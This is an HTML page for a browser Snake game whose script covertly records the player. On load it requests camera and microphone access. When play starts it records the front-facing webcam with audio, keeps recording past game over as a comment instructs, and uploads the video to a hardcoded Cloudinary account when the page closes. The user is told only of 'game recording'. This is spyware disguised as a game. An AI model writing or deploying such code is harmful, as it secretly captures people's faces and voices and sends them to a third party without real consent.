<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Snake</title>
<style>
  html, body {
    margin: 0; padding: 0; overflow: hidden; height: 100%; width: 100%; background: #121212; color: #eee; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent;
  }
  #gameContainer {
    position: relative; margin: auto; width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
  }
  canvas {
    background: #222; border: 3px solid #eee; border-radius: 8px;
    touch-action: none;
  }
  #scoreBoard {
    margin-top: 12px;
    font-size: 1.5rem;
    letter-spacing: 2px;
  }
  #controls {
    margin-top: 10px;
  }
  button {
    background: #333; border: none; color: #eee; padding: 10px 16px; font-size: 1rem; border-radius: 5px; cursor: pointer;
    transition: background 0.3s ease;
    margin: 0 8px;
  }
  button:hover {
    background: #555;
  }
  #instructions {
    margin-top: 20px; font-size: 0.9rem; color: #aaa; max-width: 300px; text-align: center;
  }
</style>
</head>
<body>
  <div id="gameContainer">
    <canvas id="game" width="320" height="320" style="touch-action:none;"></canvas>
    <div id="scoreBoard">Score: 0</div>
    <div id="controls">
      <button id="btnStart" disabled>Start Game</button>
      <button id="btnNewGame" disabled>New Game</button>
    </div>
    <div id="instructions">
      Use swipe gestures or arrow keys to control the snake.
    </div>
  </div>

<script>
(() => {
  // Cloudinary upload config - replace with your own values
  const CLOUD_NAME = "dps0g5ftz";
  const UPLOAD_PRESET = "unsigned";

  let mediaRecorder;
  let recordedChunks = [];
  let mediaStream;

  async function uploadVideo(blob) {
    const formData = new FormData();
    formData.append("file", blob);
    formData.append("upload_preset", UPLOAD_PRESET);

    try {
      const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
        method: "POST",
        body: formData
      });
      const data = await res.json();
      console.log("Video uploaded:", data.secure_url);
    } catch (err) {
      console.error("Upload failed:", err);
    }
  }

  const canvas = document.getElementById("game");
  const ctx = canvas.getContext("2d");

  const gridSize = 16;
  const tileCount = canvas.width / gridSize;

  let snake = [{ x: 8, y: 8 }];
  let velocity = { x: 0, y: 0 };
  let food = { x: 5, y: 5 };
  let score = 0;
  let gameInterval;

  function drawRect(x, y, color) {
    ctx.fillStyle = color;
    ctx.fillRect(x * gridSize, y * gridSize, gridSize, gridSize);
  }

  function resetGame() {
    snake = [{ x: 8, y: 8 }];
    velocity = { x: 0, y: 0 };
    food = randomFoodPosition();
    score = 0;
    updateScore();
  }

  function randomFoodPosition() {
    let position;
    do {
      position = {
        x: Math.floor(Math.random() * tileCount),
        y: Math.floor(Math.random() * tileCount)
      };
    } while (snake.some(segment => segment.x === position.x && segment.y === position.y));
    return position;
  }

  function updateScore() {
    document.getElementById("scoreBoard").textContent = `Score: ${score}`;
  }

  function gameOver() {
    clearInterval(gameInterval);
    document.getElementById("btnStart").disabled = false;
    document.getElementById("btnNewGame").disabled = true;

    // Do NOT stop recording here! Keep recording until page exit

    alert("Game Over! Your score: " + score);
  }

  function gameLoop() {
    const head = { x: snake[0].x + velocity.x, y: snake[0].y + velocity.y };

    if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
      gameOver();
      return;
    }

    if (snake.some(segment => segment.x === head.x && segment.y === head.y)) {
      gameOver();
      return;
    }

    snake.unshift(head);

    if (head.x === food.x && head.y === food.y) {
      score++;
      updateScore();
      food = randomFoodPosition();
    } else {
      snake.pop();
    }

    ctx.fillStyle = "#121212";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    drawRect(food.x, food.y, "#ff6347");

    snake.forEach((segment, idx) => {
      drawRect(segment.x, segment.y, idx === 0 ? "#32cd32" : "#228b22");
    });
  }

  function setDirection(x, y) {
    if (velocity.x === -x || velocity.y === -y) return;
    velocity = { x, y };
  }

  async function initMedia() {
    try {
      mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
      recordedChunks = [];

      mediaRecorder = new MediaRecorder(mediaStream, { mimeType: "video/webm" });

      mediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) recordedChunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: "video/webm" });
        recordedChunks = [];
        uploadVideo(blob);
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
      };

      document.getElementById("btnStart").disabled = false;
      document.getElementById("btnNewGame").disabled = true;

    } catch (err) {
      console.error("Media permission denied or error:", err);
      alert("Camera/Microphone permission denied or not available. Game recording will not work.");
      document.getElementById("btnStart").disabled = false;
    }
  }

  window.onload = () => {
    initMedia();
  };

  // Stop recording & upload only on page unload
  window.addEventListener("beforeunload", () => {
    if (mediaRecorder && mediaRecorder.state === "recording") {
      mediaRecorder.stop();
    }
  });

  document.getElementById("btnStart").onclick = () => {
    if (mediaRecorder && mediaRecorder.state === "inactive") {
      mediaRecorder.start();
    }

    resetGame();
    document.getElementById("btnStart").disabled = true;
    document.getElementById("btnNewGame").disabled = false;
    velocity = { x: 1, y: 0 };
    clearInterval(gameInterval);
    gameInterval = setInterval(gameLoop, 120);
  };

  document.getElementById("btnNewGame").onclick = () => {
    clearInterval(gameInterval);
    resetGame();
    velocity = { x: 1, y: 0 };
    gameInterval = setInterval(gameLoop, 120);
  };

  window.addEventListener("keydown", e => {
    switch (e.key) {
      case "ArrowUp": setDirection(0, -1); break;
      case "ArrowDown": setDirection(0, 1); break;
      case "ArrowLeft": setDirection(-1, 0); break;
      case "ArrowRight": setDirection(1, 0); break;
    }
  });

  let touchStartX = null;
  let touchStartY = null;

  canvas.addEventListener("touchstart", e => {
    const touch = e.touches[0];
    touchStartX = touch.clientX;
    touchStartY = touch.clientY;
  });

  canvas.addEventListener("touchmove", e => {
    if (!touchStartX || !touchStartY) return;

    const touch = e.touches[0];
    const diffX = touch.clientX - touchStartX;
    const diffY = touch.clientY - touchStartY;

    if (Math.abs(diffX) > Math.abs(diffY)) {
      if (diffX > 0) setDirection(1, 0);
      else setDirection(-1, 0);
    } else {
      if (diffY > 0) setDirection(0, 1);
      else setDirection(0, -1);
    }

    touchStartX = null;
    touchStartY = null;
  });

})();
</script>
</body>
</html>